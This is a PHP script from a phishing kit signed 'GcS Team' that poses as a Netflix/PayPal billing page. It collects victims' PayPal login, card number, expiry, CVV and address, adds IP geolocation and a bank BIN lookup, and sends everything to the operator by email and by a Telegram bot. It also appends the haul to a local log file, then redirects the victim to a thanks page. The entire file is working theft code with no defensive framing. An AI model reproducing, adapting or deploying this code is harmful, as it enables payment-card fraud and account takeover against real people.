<?php
/*
  ________             _________    ___________                            
 /  _____/    ____    /   _____/    \__    ___/   ____   _____      _____  
/   \  ___  _/ ___\   \_____  \       |    |    _/ __ \  \__  \    /     \ 
\    \_\  \ \  \___   /        \      |    |    \  ___/   / __ \_ |  Y Y  \
 \______  /  \___  > /_______  /      |____|     \___  > (____  / |__|_|  /
        \/       \/          \/                      \/       \/        \/ 
*/
session_start();
include "../../anti/anti1.php";
include "../../anti/anti2.php"; 
include "../../anti/anti3.php"; 
include "../../anti/anti4.php"; 
include "../../anti/anti5.php"; 
include "../../anti/anti7.php";
include '../../email.php';
$ip = getenv("REMOTE_ADDR");
$link = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'] ;
$message = "[link: $link ]\r\n";

$_SESSION['country'] = $_POST['country'];
$_SESSION['ccppl'] = $_POST['ccppl'];
$_SESSION['expppl'] = $_POST['expppl'];
$_SESSION['cvvppl'] = $_POST['cvvppl'];
$_SESSION['firstnameppl'] = $_POST['firstnameppl'];
$_SESSION['lastnameppl'] = $_POST['lastnameppl'];
$_SESSION['address1ppl'] = $_POST['address1ppl'];
$_SESSION['address2ppl'] = $_POST['address2ppl'];
$_SESSION['cityppl'] = $_POST['cityppl'];
$_SESSION['stateppl'] = $_POST['stateppl'];
$_SESSION['zipcodeppl'] = $_POST['zipcodeppl'];
$_SESSION['phonenumppl'] = $_POST['phonenumppl'];
$_SESSION['emailppl'] = $_POST['emailppl'];



$file = fopen("NetFlix_PayPal_RzlT.txt","a");
fwrite($file,$ip."  -  ".gmdate ("Y-n-d")." @ ".gmdate ("H:i:s")."\n");


$IP_LOOKUP = @json_decode(file_get_contents("http://ip-api.com/json/".$ip));
$COUNTRY = $IP_LOOKUP->country . "\r\n";
$countryCode = $IP_LOOKUP->countryCode. "\r\n";
$regionName    = $IP_LOOKUP->regionName . "\r\n";
$lat    = $IP_LOOKUP->lat . "\r\n";
$lon    = $IP_LOOKUP->long . "\r\n";
$timezone    = $IP_LOOKUP->timezone . "\r\n";
$isp    = $IP_LOOKUP->isp . "\r\n";
$as    = $IP_LOOKUP->as . "\r\n";
$CITY    = $IP_LOOKUP->city . "\r\n";
$REGION  = $IP_LOOKUP->region . "\r\n";
$STATE   = $IP_LOOKUP->regionName . "\r\n";
$ZIPCODE = $IP_LOOKUP->zip . "\r\n";


$hostname = gethostbyaddr($ip);
$bincheck = $_POST['ccppl'] ;
$bincheck = preg_replace('/\s/', '', $bincheck);


$bin = $_POST['ccppl'] ;
$bin = preg_replace('/\s/', '', $bin);
$bin = substr($bin,0,8);
$cardlastdigit = substr($_POST['creditCardNumber'],12,16);
$url = "https://lookup.binlist.net/".$bin;
$headers = array();
$headers[] = 'Accept-Version: 3';
$ch = curl_init();  
curl_setopt($ch,CURLOPT_URL,$url);
curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$resp=curl_exec($ch);
curl_close($ch);
$xBIN = json_decode($resp, true);

$_SESSION['bank_name'] = $xBIN["bank"]["name"];
$_SESSION['bank_scheme'] = strtoupper($xBIN["scheme"]);
$_SESSION['bank_type'] = strtoupper($xBIN["type"]);
$_SESSION['bank_brand'] = strtoupper($xBIN["brand"]);
$_SESSION['bank_country'] = $xBIN["country"]["name"];


$ip = $_SERVER['REMOTE_ADDR'];
$hostname = gethostbyaddr($ip);
$subject = "GcS Team 💖 NetFlix log 💖  $ip";
$headers = "From: GcS-Team<info@GcSTeam.com>";
$send = $email; 


$message = "[GcS Team][+]━━━━━━━━【💖 NetFlix PayPal log 💖】━━━━━━━━[+][GcS Team]\r\n";
$message .= "|PayPal Email      : ".$_SESSION['login_email']."\r\n";
$message .= "|PayPal Password      	 : ".$_SESSION['login_password']."\r\n";
$message .= "[+]━━━━━━━━【💻 PayPal's CC INFO】━━━━━━━━[+]\r\n";
$message .= "|[💳 Credit Card Number]      : ".$_POST['ccppl']."\r\n";
$message .= "|[🔄 Expiry Date ]      : ".$_POST['expppl']."\r\n";
$message .= "|[🔑 (CVV)]      : ".$_POST['cvvppl']."\r\n";
$message .= "|Bank name 🏦      : ".$_SESSION['bank_name']."\r\n";
$message .= "|Bank scheme      : ".$_SESSION['bank_scheme']."\r\n";
$message .= "|Bank type      : ".$_SESSION['bank_type']."\r\n";
$message .= "|Bank Brand      : ".$_SESSION['bank_brand']."\r\n";
$message .= "|Bank Country      : ".$_SESSION['bank_country']."\r\n";
$message .= "[+]━━━━━━━━【📓 PayPal's Billing INFO】━━━━━━━━[+]\r\n";
$message .= "|First name      : ".$_POST['firstnameppl']."\r\n";
$message .= "|Last name      : ".$_POST['lastnameppl']."\r\n";
$message .= "|Country [🌐]     : ".$_POST['country']."\r\n";
$message .= "|Address 1 [📓]     : ".$_POST['address1ppl']."\r\n";
$message .= "|Address 2 [📓]     : ".$_POST['address2ppl']."\r\n";
$message .= "|City 🏦     : ".$_POST['cityppl']."\r\n";
$message .= "|State 🌃     : ".$_POST['stateppl']."\r\n";
$message .= "|Zip code      : ".$_POST['zipcodeppl']."\r\n";
$message .= "|Phone 📞      : ".$_POST['phonenumppl']."\r\n";
$message .= "|PayPal Email 📧     : ".$_POST['emailppl']."\r\n";
$message .= "[+]━━━━━━━━【💻 System INFO】━━━━━━━━[+]\r\n";
$message .=$ip."\nCountry : ".$COUNTRY."City: " .$CITY."Region : " .$REGION."State: " .$STATE."Zip : " .$ZIPCODE."country code: " .$countryCode."lat: " .$lat."lon: " .$lon."timezone: " .$timezone."isp: " .$isp."as: " .$as;
$message .= "UserAgent  :  ".$_SERVER['HTTP_USER_AGENT']."\n";
$message .= "[GcS Team][+]━━━━━━━━【💖 NetFlix PayPal log 💖】━━━━━━━━[+][GcS Team]\n";
$_SESSION['message3'] = $message;
mail($send,$subject,$message,$headers);


file_get_contents("https://api.telegram.org/bot".$api."/sendMessage?chat_id=".$chatid."&text=" . urlencode($message)."" );


$myfile = fopen("NetFlix_PayPal_RzlT.txt", "a+");
$txt = $message;
fwrite($myfile, $txt);
fclose($myfile);

HEADER("Location: ../thanks.php");


?>

